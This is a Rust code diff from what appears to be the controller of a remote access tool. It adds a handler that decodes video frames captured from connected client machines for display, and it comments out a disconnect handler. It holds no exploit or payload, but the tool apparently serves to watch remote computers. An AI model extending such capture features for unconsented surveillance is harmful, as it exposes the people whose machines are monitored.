@@ -2,10 +2,7 @@ use std::collections::HashMap;
 
 use aes_gcm::aead::generic_array::GenericArray;
 use egui::ColorImage;
-use shared::{
-    commands::*,
-    crypto::Encryption,
-};
+use shared::{commands::*, crypto::Encryption};
 use tokio::sync::mpsc::unbounded_channel;
 
 use crate::{
@@ -54,18 +51,23 @@ impl ClientManager {
                                 Response::Error(error) => {
                                     let _ = self.mouthpiece.to_ui.send(UiManagerResponse::GetResponse(mutex, ProcessedResponse::Error(error)));
                                 },
+                                Response::CapturePacket(capture_type, packet) => {
+                                    match packet {
+                                        CapturePacket::Video(data) => {
+                                            let decoded_image = image::load_from_memory(&data.data).unwrap();
+                                            let rgba_image = decoded_image.to_rgba8();
+                                            let image = ColorImage::from_rgba_unmultiplied(
+                                                [data.width as usize, data.height as usize],
+                                                rgba_image.as_raw(),
+                                            );
+
+                                            let _ = self.mouthpiece.to_ui.send(UiManagerResponse::GetResponse(mutex, ProcessedResponse::CapturePacket(capture_type, image)));
+
+                                        },
+                                        CapturePacket::Audio(_data) => {/* implement later */}
+                                    }
+                                }
                                 ///////////////////////////////////
-                                Response::Screenshot(screenshot) => {
-                                    let decoded_image = image::load_from_memory(&screenshot.data).unwrap();
-                                    let rgba_image = decoded_image.to_rgba8();
-                                    let image = ColorImage::from_rgba_unmultiplied(
-                                        [screenshot.width as usize, screenshot.height as usize],
-                                        rgba_image.as_raw(),
-                                    );
-
-                                    let _ = self.mouthpiece.to_ui.send(UiManagerResponse::GetResponse(mutex, ProcessedResponse::Screenshot(image)));
-
-                                },
                                 Response::ComputerInfo(info) => {
                                     let socket = self.clients.get(&mutex).unwrap().socket.clone(); // pray
                                     let _ = self.mouthpiece.to_ui.send(UiManagerResponse::GetResponse(mutex, ProcessedResponse::ComputerInfo(
@@ -122,14 +124,14 @@ impl ClientManager {
                             self.clients.clear();
                             let _ = self.mouthpiece.to_ui.send(UiManagerResponse::RemoveAll);
                         },
-                        ServerManagerMessage::ClientDisconnect(mutex) => {
+                        /*ServerManagerMessage::ClientDisconnect(mutex) => {
                             if let Some(client) = self.clients.get(&mutex) {
                                 println!("[*] aborting task {}", mutex);
                                 client.handle.abort();
                                 self.clients.remove(&mutex);
                                 let _ = self.mouthpiece.to_ui.send(UiManagerResponse::Remove(mutex));
                             }
-                        }
+                        }*/
                         ServerManagerMessage::ClientConnect(whitelisted, stream) => {
                             {
                                 let (to_client, from_manager) = unbounded_channel::<ClientCommand>();
